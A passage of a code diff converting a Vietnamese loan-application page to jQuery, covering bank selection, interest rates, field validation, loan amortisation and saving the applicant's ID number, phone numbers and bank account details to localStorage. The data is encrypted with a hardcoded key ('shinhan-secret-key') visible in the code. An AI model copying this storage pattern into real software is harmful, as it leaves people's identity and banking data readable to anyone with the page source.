-                    bankToggle.innerHTML = `<img src="${imgSrc}" alt="${text} Logo" class="bank-logo">${text}`;
-                    bankInput.value = value;
-                    bankList.classList.remove('show');
-                    bankToggle.setAttribute('aria-expanded', 'false');
-                    bankSelect.classList.remove('is-invalid');
-                    bankError.style.display = 'none';
-                    debouncedSave();
-                });
-
-                option.addEventListener('keydown', (e) => {
-                    if (e.key === 'Enter' || e.key === ' ') {
+            bankOptions.each(function() {
+                $(this).on('click keydown', function(e) {
+                    if (e.type === 'click' || e.key === 'Enter' || e.key === ' ') {
                         e.preventDefault();
-                        option.click();
+                        const value = $(this).data('value');
+                        const text = $(this).text().trim();
+                        const imgSrc = $(this).find('img').attr('src');
+                        bankToggle.html(`<img src="${imgSrc}" alt="${text} Logo" class="bank-logo">${text}`);
+                        bankInput.val(value);
+                        bankList.removeClass('show');
+                        bankToggle.attr('aria-expanded', 'false');
+                        bankSelect.removeClass('is-invalid');
+                        bankError.hide();
+                        debounceSave();
                     }
                 });
             });
 
-            document.addEventListener('click', (e) => {
-                if (!bankSelect.contains(e.target)) {
-                    bankList.classList.remove('show');
-                    bankToggle.setAttribute('aria-expanded', 'false');
+            $(document).on('click', function(e) {
+                if (!bankSelect.is(e.target) && !bankSelect.has(e.target).length) {
+                    bankList.removeClass('show');
+                    bankToggle.attr('aria-expanded', 'false');
                 }
             });
 
-            document.getElementById('registrationForm').addEventListener('submit', (e) => {
-                if (!bankInput.value) {
-                    bankSelect.classList.add('is-invalid');
-                    bankError.style.display = 'block';
-                    bankError.textContent = 'Vui lòng chọn ngân hàng.';
+            $('#registrationForm').on('submit', function(e) {
+                if (!bankInput.val()) {
+                    bankSelect.addClass('is-invalid');
+                    bankError.show().text('Vui lòng chọn ngân hàng.');
                 } else {
-                    bankSelect.classList.remove('is-invalid');
-                    bankError.style.display = 'none';
+                    bankSelect.removeClass('is-invalid');
+                    bankError.hide();
                 }
             });
         }
 
-        const updateInterestRate = () => {
-            const loanType = document.getElementById('loanType').value || userData.loanType || '';
-            const interestRate = document.getElementById('interestRate');
+        function updateInterestRate() {
+            const loanType = $('#loanType').val() || userData.loanType || '';
+            const interestRate = $('#interestRate');
             const rates = {
-                'Vay tín chấp': 7.8,
+                'Vay tín chấp': 12.0,
                 'Vay thế chấp': 6.2,
-                'Vay thấu chi': 8.5,
+                'Vay mua nhà': 5.5,
+                'Vay mua xe': 6.4,
+                'Vay tiêu dùng': 10.0,
                 'Vay trả góp': 7.2
             };
             const rate = rates[loanType] || 7.0;
-            interestRate.value = rate.toFixed(2);
-            console.log(`Interest rate set to ${rate}% for ${loanType || 'default'}`);
-            interestRate.dispatchEvent(new Event('change'));
-        };
+            interestRate.val(rate.toFixed(2));
+            console.log(`Lãi suất: ${rate}% cho ${loanType || 'mặc định'}`);
+            interestRate.trigger('change');
+        }
 
-        document.getElementById('loanType').addEventListener('change', updateInterestRate);
+        $('#loanType').change(updateInterestRate);
 
-        document.getElementById('interestRate').addEventListener('change', function() {
-            this.value = parseFloat(this.value).toFixed(2);
+        $('#interestRate').change(function() {
+            $(this).val(parseFloat($(this).val()).toFixed(2));
         });
-
-        window.onload = function() {
-            loadUserData();
-            updateInterestRate();
-        };
 
         function getCurrentDate() {
             const today = new Date();
@@ -1181,16 +1157,14 @@
 
         function checkLocalStorageQuota() {
             try {
-                if (!window.localStorage) {
-                    throw new Error('localStorage is not available');
-                }
+                if (!window.localStorage) throw new Error('localStorage not available');
                 const testKey = '__test__';
                 localStorage.setItem(testKey, 'test');
                 localStorage.removeItem(testKey);
                 return true;
             } catch (e) {
-                console.error('LocalStorage error:', e);
-                alert('Không thể truy cập localStorage. Vui lòng kiểm tra cài đặt trình duyệt.');
+                console.error('Local storage error:', e);
+                alert('Cannot access localStorage. Please check browser settings.');
                 return false;
             }
         }
@@ -1204,7 +1178,7 @@
                 return true;
             } catch (error) {
                 console.error('Error saving userData to localStorage:', error);
-                alert('Lỗi lưu dữ liệu. Vui lòng thử lại hoặc liên hệ hỗ trợ.');
+                alert('Error saving data. Please check or contact support.');
                 return false;
             }
         }
@@ -1216,36 +1190,36 @@
                 if (storedData) {
                     userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
                     console.log('Loaded userData from localStorage:', userData);
-                    document.getElementById('fullName').value = userData.fullName || '';
-                    document.getElementById('dob').value = userData.dob || '';
-                    document.getElementById('gender').value = userData.gender || '';
-                    document.getElementById('contactAddress').value = userData.contactAddress || '';
-                    document.getElementById('hometown').value = userData.hometown || '';
-                    document.getElementById('nationality').value = userData.nationality || 'Việt Nam';
-                    document.getElementById('cccd').value = userData.cccd || '';
-                    document.getElementById('idIssueDate').value = userData.idIssueDate || '';
-                    document.getElementById('issuePlace').value = userData.issuePlace || '';
-                    document.getElementById('phone').value = userData.phone || '';
-                    document.getElementById('email').value = userData.email || '';
-                    document.getElementById('loanType').value = userData.loanType || '';
-                    document.getElementById('loanTerm').value = userData.loanTerm || '';
-                    document.getElementById('loanAmount').value = userData.loanAmount || '';
-                    document.getElementById('disbursementDate').value = userData.disbursementDate || getCurrentDate();
-                    document.getElementById('interestRate').value = userData.interestRate || '7.00';
-                    document.getElementById('monthlyIncome').value = userData.monthlyIncome || '';
-                    document.getElementById('occupation').value = userData.occupation || '';
-                    document.getElementById('loanPurpose').value = userData.loanPurpose || '';
-                    document.getElementById('relativePhone').value = userData.relativePhone || '';
-                    document.getElementById('relationship').value = userData.relationship || '';
-                    document.getElementById('accountName').value = userData.accountName || '';
-                    document.getElementById('accountNumber').value = userData.accountNumber || '';
+                    $('#fullName').val(userData.fullName || '');
+                    $('#dob').val(userData.dob || '');
+                    $('#gender').val(userData.gender || '');
+                    $('#contactAddress').val(userData.contactAddress || '');
+                    $('#hometown').val(userData.hometown || '');
+                    $('#nationality').val(userData.nationality || 'Việt Nam');
+                    $('#cccd').val(userData.cccd || '');
+                    $('#idIssueDate').val(userData.idIssueDate || '');
+                    $('#issuePlace').val(userData.issuePlace || '');
+                    $('#phone').val(userData.phone || '');
+                    $('#email').val(userData.email || '');
+                    $('#loanType').val(userData.loanType || '');
+                    $('#loanTerm').val(userData.loanTerm || '');
+                    $('#loanAmount').val(userData.loanAmount || '');
+                    $('#disbursementDate').val(userData.disbursementDate || getCurrentDate());
+                    $('#interestRate').val(userData.interestRate || '7.00');
+                    $('#monthlyIncome').val(userData.monthlyIncome || '');
+                    $('#occupation').val(userData.occupation || '');
+                    $('#loanPurpose').val(userData.loanPurpose || '');
+                    $('#relativePhone').val(userData.relativePhone || '');
+                    $('#relationship').val(userData.relationship || '');
+                    $('#accountName').val(userData.accountName || '');
+                    $('#accountNumber').val(userData.accountNumber || '');
                     if (userData.bankName) {
-                        const bankOption = document.querySelector(`.custom-select-option[data-value="${userData.bankName}"]`);
-                        if (bankOption) {
-                            const text = bankOption.textContent.trim();
-                            const imgSrc = bankOption.querySelector('img').src;
-                            document.querySelector('.custom-select-toggle').innerHTML = `<img src="${imgSrc}" alt="${text} Logo" class="bank-logo">${text}`;
-                            document.getElementById('bankName').value = userData.bankName;
+                        const bankOption = $(`.custom-select-option[data-value="${userData.bankName}"]`);
+                        if (bankOption.length) {
+                            const text = bankOption.text().trim();
+                            const imgSrc = bankOption.find('img').attr('src');
+                            $('.custom-select-toggle').html(`<img src="${imgSrc}" alt="${text} Logo" class="bank-logo">${text}`);
+                            $('#bankName').val(userData.bankName);
                         }
                     }
                     updateInterestRate();
@@ -1270,386 +1244,356 @@
             const today = new Date();
             today.setHours(0, 0, 0, 0);
             const fields = [
-                { id: 'fullName', errorId: 'fullNameError', validate: value => value.trim().length > 2, message: 'Họ và tên phải trùng với thông tin trên CCCD.' },
-                { id: 'dob', errorId: 'dobError', validate: value => {
+                { id: 'fullName', errorId: 'fullNameError', validation: value => value.trim().length > 2, message: 'Họ và tên phải trùng khớp với CCCD.' },
+                { id: 'dob', errorId: 'dobError', validation: value => {
                     if (!value) return false;
                     const regex = /^\d{2}\/\d{2}\/\d{4}$/;
                     if (!regex.test(value)) return false;
                     const [day, month, year] = value.split('/').map(Number);
                     if (year < 1900 || year > today.getFullYear()) return false;
                     if (!isValidDate(day, month, year)) return false;
-                    const date = new Date(year, month - 1, day);
-                    return date <= today;
-                }, message: 'Ngày sinh phải hợp lệ (dd/mm/yyyy, ngày sinh không hợp lệ).' },
-                { id: 'gender', errorId: 'genderError', validate: value => value !== '', message: 'Vui lòng chọn giới tính.' },
-                { id: 'contactAddress', errorId: 'contactAddressError', validate: value => value.trim().length > 5, message: 'Địa chỉ thường trú phải trùng thông tin trên CCCD.' },
-                { id: 'hometown', errorId: 'hometownError', validate: value => value.trim().length > 5, message: 'Quê quán phải trùng thông tin trên CCCD.' },
-                { id: 'nationality', errorId: 'nationalityError', validate: value => value.trim().length > 0, message: 'Vui lòng nhập quốc tịch.' },
-                { id: 'cccd', errorId: 'cccdError', validate: value => {
-                    const cleanValue = value.replace(/\s/g, '');
-                    return /^\d{12}$/.test(cleanValue);
-                }, message: 'CCCD phải đúng 12 chữ số.' },
-                { id: 'idIssueDate', errorId: 'idIssueDateError', validate: value => {
-                    if (!value) return false;
-                    const regex = /^\d{2}\/\d{2}\/\d{4}$/;
-                    if (!regex.test(value)) return false;
-                    const [day, month, year] = value.split('/').map(Number);
-                    if (year < 1900 || year > today.getFullYear()) return false;
-                    if (!isValidDate(day, month, year)) return false;
-                    const date = new Date(year, month - 1, day);
-                    return date <= today;
-                }, message: 'Ngày cấp phải hợp lệ (dd/mm/yyyy) và không phải tương lai.' },
-                { id: 'issuePlace', errorId: 'issuePlaceError', validate: value => value !== '', message: 'Vui lòng chọn nơi cấp CCCD.' },
-                { id: 'phone', errorId: 'phoneError', validate: value => {
-                    if (!value) return false;
-                    const cleanValue = value.replace(/\s/g, '');
-                    return /^0[1-9]\d{8}$/.test(cleanValue);
-                }, message: 'Số điện thoại không hợp lệ (10 chữ số, bắt đầu bằng 0).' },
-                { id: 'relativePhone', errorId: 'relativePhoneError', validate: value => {
-                    if (!value) return false;
-                    const cleanValue = value.replace(/\s/g, '');
-                    return /^0[1-9]\d{8}$/.test(cleanValue);
-                }, message: 'Số điện thoại người thân không hợp lệ (10 chữ số, bắt đầu bằng 0).' },
-                { id: 'email', errorId: 'emailError', validate: value => /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(value), message: 'Email không hợp lệ (ví dụ: example@domain.com).' },
-                { id: 'loanType', errorId: 'loanTypeError', validate: value => value !== '', message: 'Vui lòng chọn hình thức vay.' },
-                { id: 'loanTerm', errorId: 'loanTermError', validate: value => value !== '', message: 'Vui lòng chọn thời hạn vay.' },
-                { id: 'loanAmount', errorId: 'loanAmountError', validate: value => {
-                    if (value === 'other') {
-                        const customValue = document.getElementById('customLoanAmount').value.replace(/,/g, '');
-                        const numValue = parseFloat(customValue);
-                        return !isNaN(numValue) && numValue >= 10000000;
-                    }
-                    return value !== '' && value !== 'other';
-                }, message: 'Vui lòng chọn hoặc nhập số tiền vay (>= 10,000,000 VND).' },
-                { id: 'disbursementDate', errorId: 'disbursementDateError', validate: value => {
-                    if (!value) return false;
-                    const date = new Date(value);
-                    return !isNaN(date) && date >= today;
-                }, message: 'Ngày giải ngân phải từ hôm nay trở đi.' },
-                { id: 'interestRate', errorId: 'interestRateError', validate: value => {
-                    const numValue = parseFloat(value);
-                    return !isNaN(numValue) && numValue >= 5 && numValue <= 10;
-                }, message: 'Lãi suất phải từ 5% đến 10%.' },
-                { id: 'monthlyIncome', errorId: 'monthlyIncomeError', validate: value => {
-                    const cleanValue = value.replace(/[,]/g, '');
-                    const numericValue = parseFloat(cleanValue);
-                    return !isNaN(numericValue) && numericValue >= 3000000;
-                }, message: 'Thu nhập phải từ 3,000,000 VND.' },
-                { id: 'occupation', errorId: 'occupationError', validate: value => value !== '', message: 'Vui lòng chọn nghề nghiệp.' },
-                { id: 'loanPurpose', errorId: 'loanPurposeError', validate: value => value !== '', message: 'Vui lòng chọn mục đích vay.' },
-                { id: 'relationship', errorId: 'relationshipError', validate: value => value !== '', message: 'Vui lòng chọn quan hệ.' },
-                { id: 'accountName', errorId: 'accountNameError', validate: value => value.trim().length > 2, message: 'Tên chủ tài khoản phải trùng thông tin đăng ký.' },
-                { id: 'accountNumber', errorId: 'accountNumberError', validate: value => {
-                    const cleanValue = value.replace(/\s/g, '');
-                    return /^\d{8,20}$/.test(cleanValue);
-                }, message: 'Số tài khoản phải từ 8 đến 20 chữ số.' },
-                { id: 'bankName', errorId: 'bankNameError', validate: value => value !== '', message: 'Vui lòng chọn ngân hàng.' },
-                { id: 'privacyConsent', errorId: 'privacyConsentError', validate: value => value === true, message: 'Vui lòng đồng ý chính sách bảo mật.' }
-            ];
+                    return new Date(year, month - 1, day) <= today;
+                }, message: 'Ngày sinh hợp lệ (dd/mm/yyyy).' },
+                { id: 'gender', errorId: 'genderError', validation: value => value !== '', message: 'Chọn giới tính.' },
+                { id: 'contactAddress', errorId: 'contactAddressError', validation: value => value.trim().length > 5, message: 'Địa chỉ thường trú.' },
+{ id: 'hometown', errorId: 'hometownError', validation: value => value.trim().length > 5, message: 'Quê quán.' },
+{ id: 'nationality', errorId: 'nationalityError', validation: value => value.trim().length > 0, message: 'Nhập quốc tịch.' },
+{ id: 'cccd', errorId: 'cccdError', validation: value => /^\d{12}$/.test(value.replace(/\s/g, '')), message: 'CCCD 12 số.' },
+{ id: 'idIssueDate', errorId: 'idIssueDateError', validation: value => {
+    if (!value) return false;
+    const regex = /^\d{2}\/\d{2}\/\d{4}$/;
+    if (!regex.test(value)) return false;
+    const [day, month, year] = value.split('/').map(Number);
+    if (year < 1900 || year > today.getFullYear()) return false;
+    if (!isValidDate(day, month, year)) return false;
+    return new Date(year, month - 1, day) <= today;
+}, message: 'Ngày cấp hợp lệ (dd/mm/yyyy).' },
+{ id: 'issuePlace', errorId: 'issuePlaceError', validation: value => value !== '', message: 'Chọn nơi cấp CCCD.' },
+{ id: 'phone', errorId: 'phoneError', validation: value => /^0[1-9]\d{8}$/.test(value.replace(/\s/g, '')), message: 'Số điện thoại không hợp lệ (10 số, bắt đầu 0).' },
+{ id: 'relativePhone', errorId: 'relativePhoneError', validation: value => /^0[1-9]\d{8}$/.test(value.replace(/\s/g, '')), message: 'Số điện thoại không hợp lệ (10 số, bắt đầu 0).' },
+{ id: 'email', errorId: 'emailError', validation: value => /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(value), message: 'Email không hợp lệ.' },
+{ id: 'loanType', errorId: 'loanTypeError', validation: value => value !== '', message: 'Chọn hình thức vay.' },
+{ id: 'loanTerm', errorId: 'loanTermError', validation: value => value !== '', message: 'Chọn thời hạn vay.' },
+{ id: 'loanAmount', errorId: 'loanAmountError', validation: value => {
+    if (value === 'other') {
+        const customValue = $('#customLoanAmount').val().replace(/,/g, '');
+        const numValue = parseFloat(customValue);
+        return !isNaN(numValue) && numValue >= 10000000;
+    }
+    return value !== '' && value !== 'other';
+}, message: 'Chọn hoặc nhập số tiền vay (>= 10.000.000 VNĐ).' },
+{ id: 'disbursementDate', errorId: 'disbursementDateError', validation: value => {
+    if (!value) return false;
+    const date = new Date(value);
+    return !isNaN(date) && date >= today;
+}, message: 'Ngày giải ngân từ hôm nay trở đi.' },
+{ id: 'interestRate', errorId: 'interestRateError', validation: value => {
+    const numValue = parseFloat(value);
+    return !isNaN(numValue) && numValue >= 5 && numValue <= 15;
+}, message: 'Lãi suất từ 5% đến 15%.' },
+{ id: 'monthlyIncome', errorId: 'monthlyIncomeError', validation: value => {
+    const cleanValue = value.replace(/,/g, '');
+    const numericValue = parseFloat(cleanValue);
+    return !isNaN(numericValue) && numericValue >= 3000000;
+}, message: 'Thu nhập từ 3.000.000 VNĐ.' },
+{ id: 'occupation', errorId: 'occupationError', validation: value => value !== '', message: 'Chọn nghề nghiệp.' },
+{ id: 'loanPurpose', errorId: 'loanPurposeError', validation: value => value !== '', message: 'Chọn mục đích vay.' },
+{ id: 'relationship', errorId: 'relationshipError', validation: value => value !== '', message: 'Chọn quan hệ.' },
+{ id: 'accountName', errorId: 'accountNameError', validation: value => value.trim().length > 2, message: 'Tên tài khoản trùng khớp đăng ký.' },
+{ id: 'accountNumber', errorId: 'accountNumberError', validation: value => /^\d{8,20}$/.test(value.replace(/\s/g, '')), message: 'Số tài khoản từ 8-20 số.' },
+{ id: 'bankName', errorId: 'bankNameError', validation: value => value !== '', message: 'Chọn ngân hàng.' },
+{ id: 'privacyConsent', errorId: 'privacyConsentError', validation: value => value === true, message: 'Đồng ý chính sách bảo mật.' }
+];
 
-            fields.forEach(field => {
-                const element = document.getElementById(field.id);
-                const value = element.type === 'checkbox' ? element.checked : element.value;
-                const errorElement = document.getElementById(field.errorId);
-                const parent = element.closest('.form-group') || element.closest('.custom-select') || element.parentElement;
-                if (!field.validate(value)) {
-                    errorElement.textContent = field.message;
-                    errorElement.style.color = '#ff4d4f';
-                    errorMessages.push(`${field.id}: ${field.message}`);
-                    console.error(`Validation failed for ${field.id}: ${field.message}`);
-                    if (parent) {
-                        parent.classList.add('is-invalid');
-                        if (!firstErrorElement) firstErrorElement = element;
-                    } else {
-                        console.warn(`No parent element found for ${field.id}`);
-                    }
-                    isValid = false;
-                } else {
-                    errorElement.textContent = '';
-                    if (parent) {
-                        parent.classList.remove('is-invalid');
-                    }
-                }
-            });
-
-            if (isValid && registeredUsers.includes(document.getElementById('cccd').value)) {
-                const duplicateMessage = 'CCCD này đã được sử dụng để đăng ký.';
-                errorMessages.push(duplicateMessage);
-                console.error('Duplicate CCCD detected:', document.getElementById('cccd').value);
-                document.getElementById('cccdError').textContent = duplicateMessage;
-                document.getElementById('cccdError').style.color = '#ff4d4f';
-                const cccdParent = document.getElementById('cccd').closest('.form-group');
-                if (cccdParent) {
-                    cccdParent.classList.add('is-invalid');
-                    if (!firstErrorElement) firstErrorElement = document.getElementById('cccd');
-                }
-                isValid = false;
-            }
-
-            if (!isValid && errorMessages.length > 0) {
-                console.log('Validation errors:', errorMessages);
-                alert('Vui lòng kiểm tra các lỗi sau:\n- ' + errorMessages.join('\n- '));
-                if (firstErrorElement) {
-                    firstErrorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                    firstErrorElement.focus();
-                }
-            }
-
-            return isValid;
+fields.forEach(field => {
+    const element = document.getElementById(field.id);
+    const value = element.type === 'checkbox' ? element.checked : element.value;
+    const errorElement = document.getElementById(field.errorId);
+    const parent = element.closest('.form-group') || element.closest('.custom-select') || element.parentElement;
+    if (!field.validation(value)) {
+        errorElement.textContent = field.message;
+        errorElement.style.color = '#ff4d4f';
+        errorMessages.push(`${field.id}: ${field.message}`);
+        console.error(`Validation failed for ${field.id}: ${field.message}`);
+        if (parent) {
+            parent.classList.add('is-invalid');
+            if (!firstErrorElement) firstErrorElement = element;
         }
+        isValid = false;
+    } else {
+        errorElement.textContent = '';
+        if (parent) parent.classList.remove('is-invalid');
+    }
+});
 
-        function calculateLoan() {
-            console.log('Calculate loan triggered');
-            if (!validateForm()) {
-                console.log('Validation failed, stopping calculation');
+if (isValid && registeredUsers.includes($('#cccd').val())) {
+    const duplicateMessage = 'CCCD đã được đăng ký.';
+    errorMessages.push(duplicateMessage);
+    console.error('Duplicate CCCD detected:', $('#cccd').val());
+    $('#cccdError').text(duplicateMessage).css('color', '#ff4d4f');
+    $('#cccd').closest('.form-group').addClass('is-invalid');
+    if (!firstErrorElement) firstErrorElement = $('#cccd')[0];
+    isValid = false;
+}
+
+if (!isValid && errorMessages.length > 0) {
+    console.log('Validation errors:', errorMessages);
+    alert('Kiểm tra lỗi:\n- ' + errorMessages.join('\n- '));
+    if (firstErrorElement) {
+        firstErrorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        firstErrorElement.focus();
+    }
+}
+
+return isValid;
+}
+
+function calculateLoan() {
+    console.log('Calculating loan');
+    if (!validateForm()) {
+        console.log('Validation failed, stopping calculation');
+        return;
+    }
+
+    const spinner = $('.spinner-calculate');
+    const successMessage = $('#calculationSuccess');
+    spinner.show();
+    successMessage.hide();
+
+    setTimeout(() => {
+        const loanAmountValue = $('#loanAmount').val();
+        let loanAmount;
+        if (loanAmountValue === 'other') {
+            const customValue = $('#customLoanAmount').val().replace(/,/g, '');
+            loanAmount = parseFloat(customValue);
+            if (isNaN(loanAmount) || loanAmount < 10000000) {
+                console.error('Invalid custom loan amount:', customValue);
+                $('#customLoanAmountError').text('Số tiền vay >= 10.000.000 VNĐ.');
+                $('#customLoanAmount').closest('.form-group').addClass('is-invalid');
+                spinner.hide();
                 return;
             }
-
-            const spinner = document.querySelector('.spinner-calculate');
-            const successMessage = document.getElementById('calculationSuccess');
-            spinner.style.display = 'inline-block';
-            successMessage.style.display = 'none';
-
-            setTimeout(() => {
-                const loanAmountValue = document.getElementById('loanAmount').value;
-                let loanAmount;
-                if (loanAmountValue === 'other') {
-                    const customValue = document.getElementById('customLoanAmount').value.replace(/,/g, '');
-                    loanAmount = parseFloat(customValue);
-                    if (isNaN(loanAmount) || loanAmount < 10000000) {
-                        console.error('Invalid custom loan amount:', customValue);
-                        document.getElementById('customLoanAmountError').textContent = 'Số tiền vay phải >= 10,000,000 VND.';
-                        document.getElementById('customLoanAmount').closest('.form-group').classList.add('is-invalid');
-                        spinner.style.display = 'none';
-                        return;
-                    }
-                } else {
-                    loanAmount = parseFloat(loanAmountValue);
-                }
-
-                const loanTerm = parseInt(document.getElementById('loanTerm').value);
-                const interestRate = parseFloat(document.getElementById('interestRate').value) / 100 / 12;
-
-                if (isNaN(loanAmount) || isNaN(loanTerm) || isNaN(interestRate)) {
-                    console.error('Invalid input values:', { loanAmount, loanTerm, interestRate });
-                    alert('Vui lòng kiểm tra lại các giá trị nhập.');
-                    spinner.style.display = 'none';
-                    return;
-                }
-
-                const monthlyPayment = (loanAmount * interestRate * Math.pow(1 + interestRate, loanTerm)) / (Math.pow(1 + interestRate, loanTerm) - 1);
-                const totalAmount = monthlyPayment * loanTerm;
-                const totalInterest = totalAmount - loanAmount;
-
-                document.getElementById('calcLoanAmount').textContent = loanAmount.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
-                document.getElementById('calcMonthlyPayment').textContent = monthlyPayment.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
-                document.getElementById('calcTotalInterest').textContent = totalInterest.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
-                document.getElementById('calcTotalAmount').textContent = totalAmount.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
-
-                let balance = loanAmount;
-                const tableBody = document.getElementById('calculationTable');
-                tableBody.innerHTML = '';
-                for (let month = 1; month <= loanTerm; month++) {
-                    const interest = balance * interestRate;
-                    const principal = monthlyPayment - interest;
-                    balance -= principal;
-                    const row = `
-                        <tr>
-                            <td data-label="Tháng">${month}</td>
-                            <td data-label="Gốc">${principal.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}</td>
-                            <td data-label="Lãi">${interest.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}</td>
-                            <td data-label="Tổng">${monthlyPayment.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}</td>
-                            <td data-label="Dư nợ">${balance.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}</td>
-                        </tr>
-                    `;
-                    tableBody.innerHTML += row;
-                }
-
-                userData.monthlyPayment = monthlyPayment;
-                userData.totalInterest = totalInterest;
-                userData.totalRepayment = totalAmount;
-                saveToLocalStorage();
-
-                spinner.style.display = 'none';
-                successMessage.style.display = 'block';
-                console.log('Calculation completed successfully');
-            }, 1000);
+        } else {
+            loanAmount = parseFloat(loanAmountValue);
         }
 
-        function debounce(func, wait) {
-            let timeout;
-            return function (...args) {
-                clearTimeout(timeout);
-                timeout = setTimeout(() => func.apply(this, args), wait);
-            };
+        const loanTerm = parseInt($('#loanTerm').val());
+        const interestRate = parseFloat($('#interestRate').val()) / 100 / 12;
+
+        if (isNaN(loanAmount) || isNaN(loanTerm) || isNaN(interestRate)) {
+            console.error('Invalid inputs:', { loanAmount, loanTerm, interestRate });
+            alert('Kiểm tra giá trị nhập.');
+            spinner.hide();
+            return;
         }
 
-        function saveFormDataRealTime() {
-            const loanAmountValue = document.getElementById('loanAmount').value;
-            const loanAmount = loanAmountValue === 'other' 
-                ? document.getElementById('customLoanAmount').value.replace(/,/g, '')
-                : loanAmountValue;
-            userData = {
-                fullName: document.getElementById('fullName').value.trim() || "",
-                dob: document.getElementById('dob').value || "",
-                gender: document.getElementById('gender').value || "",
-                contactAddress: document.getElementById('contactAddress').value.trim() || "",
-                hometown: document.getElementById('hometown').value.trim() || "",
-                nationality: document.getElementById('nationality').value.trim() || "Việt Nam",
-                cccd: document.getElementById('cccd').value.trim() || "",
-                idIssueDate: document.getElementById('idIssueDate').value || "",
-                issuePlace: document.getElementById('issuePlace').value || "",
-                phone: document.getElementById('phone').value.trim().replace(/\s/g, '').replace(/^\+84/, '0') || "",
-                email: document.getElementById('email').value.trim() || "",
-                loanType: document.getElementById('loanType').value || "",
-                loanTerm: document.getElementById('loanTerm').value || "",
-                loanAmount: loanAmount || "",
-                disbursementDate: document.getElementById('disbursementDate').value || getCurrentDate(),
-                interestRate: parseFloat(document.getElementById('interestRate').value) || 7.0,
-                monthlyIncome: parseFloat(document.getElementById('monthlyIncome').value.replace(/,/g, '')) || "",
-                occupation: document.getElementById('occupation').value || "",
-                loanPurpose: document.getElementById('loanPurpose').value || "",
-                relativePhone: document.getElementById('relativePhone').value.trim().replace(/\s/g, '').replace(/^\+84/, '0') || "",
-                relationship: document.getElementById('relationship').value || "",
-                accountName: document.getElementById('accountName').value.trim() || "",
-                accountNumber: document.getElementById('accountNumber').value.trim().replace(/\s/g, '') || "",
-                bankName: document.getElementById('bankName').value || "",
-                monthlyPayment: userData.monthlyPayment || "",
-                totalInterest: userData.totalInterest || "",
-                totalRepayment: userData.totalRepayment || "",
-                currentStep: 1,
-                isRegistered: userData.isRegistered || false,
-                emailSent: userData.emailSent || false
-            };
-            saveToLocalStorage();
+        const monthlyPayment = (loanAmount * interestRate * Math.pow(1 + interestRate, loanTerm)) / (Math.pow(1 + interestRate, loanTerm) - 1);
+        const totalAmount = monthlyPayment * loanTerm;
+        const totalInterest = totalAmount - loanAmount;
+
+        $('#calcLoanAmount').text(loanAmount.toLocaleString('vi-VN'));
+        $('#calcMonthlyPayment').text(monthlyPayment.toLocaleString('vi-VN', { maximumFractionDigits: 0 }));
+        $('#calcTotalInterest').text(totalInterest.toLocaleString('vi-VN', { maximumFractionDigits: 0 }));
+        $('#calcTotalAmount').text(totalAmount.toLocaleString('vi-VN', { maximumFractionDigits: 0 }));
+
+        let balance = loanAmount;
+        const tableBody = $('#calculationTable').empty();
+        const fragment = document.createDocumentFragment();
+        for (let month = 1; month <= loanTerm; month++) {
+            const interest = balance * interestRate;
+            const principal = monthlyPayment - interest;
+            balance -= principal;
+            const row = document.createElement('tr');
+            row.innerHTML = `
+                <td data-label="Tháng">${month}</td>
+                <td data-label="Gốc">${principal.toLocaleString('vi-VN', { maximumFractionDigits: 0 })}</td>
+                <td data-label="Lãi">${interest.toLocaleString('vi-VN', { maximumFractionDigits: 0 })}</td>
+                <td data-label="Tổng">${monthlyPayment.toLocaleString('vi-VN', { maximumFractionDigits: 0 })}</td>
+                <td data-label="Dư nợ">${balance.toLocaleString('vi-VN', { maximumFractionDigits: 0 })}</td>
+            `;
+            fragment.appendChild(row);
         }
+        tableBody.append(fragment);
 
-        const debouncedSave = debounce(saveFormDataRealTime, 300);
+        userData.monthlyPayment = monthlyPayment;
+        userData.totalInterest = totalInterest;
+        userData.totalRepay = totalAmount;
+        saveToLocalStorage();
 
-        async function handleSubmit(event) {
-            event.preventDefault();
-            console.log('Form submit triggered');
-            if (!validateForm()) {
-                console.log('Validation failed, stopping submission');
-                return;
-            }
+        spinner.hide();
+        successMessage.show();
+        console.log('Calculation completed');
+    }, 1000);
+}
 
-            const spinner = document.querySelector('.spinner-submit');
-            spinner.style.display = 'inline-block';
+function debounce(func, wait) {
+    let timeout;
+    return function (...args) {
+        clearTimeout(timeout);
+        timeout = setTimeout(() => func.apply(this, args), wait);
+    };
+}
 
-            const loanAmountValue = document.getElementById('loanAmount').value;
-            const loanAmount = loanAmountValue === 'other' 
-                ? document.getElementById('customLoanAmount').value.replace(/,/g, '')
-                : loanAmountValue;
-            userData = {
-                fullName: document.getElementById('fullName').value.trim() || "",
-                dob: document.getElementById('dob').value || "",
-                gender: document.getElementById('gender').value || "",
-                contactAddress: document.getElementById('contactAddress').value.trim() || "",
-                hometown: document.getElementById('hometown').value.trim() || "",
-                nationality: document.getElementById('nationality').value.trim() || "Việt Nam",
-                cccd: document.getElementById('cccd').value.trim() || "",
-                idIssueDate: document.getElementById('idIssueDate').value || "",
-                issuePlace: document.getElementById('issuePlace').value || "",
-                phone: document.getElementById('phone').value.trim().replace(/\s/g, '').replace(/^\+84/, '0') || "",
-                email: document.getElementById('email').value.trim() || "",
-                loanType: document.getElementById('loanType').value || "",
-                loanTerm: document.getElementById('loanTerm').value || "",
-                loanAmount: loanAmount || "",
-                disbursementDate: document.getElementById('disbursementDate').value || getCurrentDate(),
-                interestRate: parseFloat(document.getElementById('interestRate').value) || 7.0,
-                monthlyIncome: parseFloat(document.getElementById('monthlyIncome').value.replace(/,/g, '')) || "",
-                occupation: document.getElementById('occupation').value || "",
-                loanPurpose: document.getElementById('loanPurpose').value || "",
